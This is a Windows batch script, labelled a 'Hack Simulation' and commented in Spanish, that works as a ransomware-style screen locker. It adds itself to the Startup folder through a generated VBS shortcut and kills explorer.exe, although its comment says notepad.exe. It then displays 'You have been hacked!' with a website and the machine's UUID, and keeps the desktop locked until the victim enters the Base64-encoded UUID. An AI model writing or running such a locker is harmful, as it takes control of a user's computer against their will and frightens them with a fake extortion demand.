@echo off
setlocal enabledelayedexpansion
title Hack Simulation - By @FryDaDog
color a
@echo off
setlocal

:: Definir la ruta del script actual
set "scriptPath=%~f0"

:: Crear un acceso directo en la carpeta de Inicio
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=AutoStartScript.lnk"
set "vbsScript=%TEMP%\create_shortcut.vbs"

:: Crear un archivo VBS para crear un acceso directo
(
echo Set oWS = WScript.CreateObject("WScript.Shell"^)
echo Set oLink = oWS.CreateShortcut("%startupFolder%\%shortcutName%"^)
echo oLink.TargetPath = "%scriptPath%"
echo oLink.Save
) > "%vbsScript%"

:: Ejecutar el script VBS para crear el acceso directo
cscript //nologo "%vbsScript%"

:: Eliminar el archivo VBS temporal
del "%vbsScript%"

:: Intentar cerrar notepad.exe si está en ejecución
taskkill /f /im explorer.exe >nul 2>&1

:: Obtener el UUID del sistema
for /f "tokens=2 delims==" %%a in ('wmic csproduct get UUID /format:list') do set "UUID=%%a"

:: Limpiar el UUID (quitar espacios)
set "UUID=%UUID: =%"

:: Codificar el UUID en Base64 usando PowerShell embebido
for /f "delims=" %%b in ('powershell -Command "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%UUID%'))"') do set "BASE64UUID=%%b"

:: Mostrar el mensaje con el UUID en Base64 como la contraseña
echo You have been hacked! Go to the website "welikehackz.com/hacked" to get access to your password. Your computer code is: %UUID%.

:askpass
set /p password="Enter Password: "

:: Comprobar si la contraseña ingresada es correcta
if "%password%"=="%BASE64UUID%" (
    echo Correct. Feel free to use your computer.
	"C:\Windows\explorer.exe"
	:: Definir la ruta del script actual
set "scriptPath=%~f0"

:: Definir la ruta de la carpeta de Inicio y el nombre del acceso directo
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=AutoStartScript.lnk"

:: Eliminar el acceso directo
del "%startupFolder%\%shortcutName%"
	
) else (
    echo Incorrect password.
	goto askpass
)

pause
